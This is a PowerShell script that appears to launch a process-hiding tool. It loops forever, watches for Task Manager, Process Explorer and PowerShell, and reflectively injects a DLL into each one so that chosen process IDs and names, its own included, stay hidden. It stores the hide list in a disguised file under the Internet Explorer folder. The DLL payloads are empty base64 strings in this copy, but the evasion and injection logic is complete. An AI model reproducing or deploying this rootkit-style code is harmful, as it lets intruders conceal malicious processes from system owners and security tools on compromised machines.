param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
$x64PayStringBase64=""
$x86PayStringBase64=""
#$Injector32Base64=""
#$Injector64Base64=""
#$Injector32Path=$PSScriptRoot+"\x86Inj.exe"
#$Injector64Path=$PSScriptRoot+"\x64Inj.exe"
$InvokeStringBase64=""
$ReflectivePEScript=$PSScriptRoot+'\ReflectiveDLLInj.ps1'
function write-fromBase64
{
param([string] $base64,[string]$filePath)
New-Item -Path $filePath -ItemType file -Force >$null
$bytesArr=[Convert]::FromBase64String($base64)
[io.file]::WriteAllBytes($filePath,$bytesArr)
}

function writeFiles
{
    param([string[]] $n=@(),[int[]] $i=@())
    $infoTransfetPath="C:\Program Files\Internet Explorer\mdsint.isf"
    $ofs=','
    New-Item -Path $infoTransfetPath -ItemType file -Force >$null
    [string]$i|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
    [string]$n|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
    #write-fromBase64 -base64 $Injector32Base64 -filePath $Injector32Path
    #write-fromBase64 -base64 $Injector64Base64 -filePath $Injector64Path
    #New-Item -Path $Injector64Path -ItemType file -Force >$null
    write-fromBase64  -base $InvokeStringBase64 -filePath $ReflectivePEScript
}

function isElevated
{
param()
 $wid=[System.Security.Principal.WindowsIdentity]::GetCurrent()
 $prp=new-object System.Security.Principal.WindowsPrincipal($wid)
 $adm=[System.Security.Principal.WindowsBuiltInRole]::Administrator
 return $prp.IsInRole($adm)
}



function is64bit($a){
try{
Add-Type -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError = true, 
 CallingConvention = CallingConvention.Winapi)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool IsWow64Process(
 [In] System.IntPtr hProcess,
 [Out, MarshalAs(UnmanagedType.Bool)] out bool wow64Process);
'@ -Name NativeMethods -Namespace Kernel32
}catch{}
if(-not [System.Environment]::Is64BitOperatingSystem)
    {return}
$is32Bit=[int]0 
if ([Kernel32.NativeMethods]::IsWow64Process($a.Handle, [ref]$is32Bit)) {$(if ($is32Bit) {$false} else {$true})} else {"IsWow64Process call failed"}
}


function procHiderDaemon
{
    param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
    $isElev =isElevated
    if(-not $isElev)
    {
        Write-Host 'This script need admin privilages!'
        $choice = read-host "Do you want to continue? (Y/N)"
        while ($choice -notmatch "[y|n]")
            {
            $choice = read-host "Invalid answer. Do you want to continue? (Y/N)"
            }
        if ($choice -eq "n")
        {
            return
        }
     }
    $frobiddenProcessesNames = @("taskmgr","procexp","procexp64","powershell")
    $frobiddenProcessesNames+=$x
    $hiddenPIDs =$i
    $hiddenProcNames=$n
    if($hiddenPIDs.Count+$hiddenProcNames.Count -eq 0)
    {
        Write-Host 'You must use either -i or -n!'
        return
    }
    $hiddenPIDs+=$pID

    writeFiles -i $hiddenPIDs -n $hiddenProcNames
    $x64DDLBytes=[Convert]::FromBase64String($x64PayStringBase64)
    $x86DLLBytes=[Convert]::FromBase64String($x86PayStringBase64)
    $livingFrobiddenProcesses =@()
    $nextLivingFrobProc=@()
    while($true)
    {
        $GetProcRes=Get-Process -Name $frobiddenProcessesNames -ErrorAction Ignore
        foreach($proc in $GetProcRes)
        {
           
                    if($proc.ID -eq $pID)
                    {
                    continue
                    }
                    $nextLivingFrobProc+=$proc.ID
                    if($livingFrobiddenProcesses -notcontains $proc.ID)
                    {
                        #Start-Sleep -m 200
                        if(Get-Process -Id $proc.ID -ErrorAction Ignore)
                            {
                            Write-Host $proc.Name is alive! pID =  $proc.ID
                            . $ReflectivePEScript
                            try
                            {
                            Invoke-ReflectivePEInjection -PEBytes $(if(is64bit($proc)){$x64DDLBytes}else{$x86DDLBytes}) -ProcId $proc.ID
                            }
                            catch{}

                            Write-Host Finished Injection to $proc.Name


                            }
                    
                    } 
         }
      $livingFrobiddenProcesses=$nextLivingFrobProc
      $nextLivingFrobProc=@()
        
    }
}

procHiderDaemon -i $i -n $n -x $x
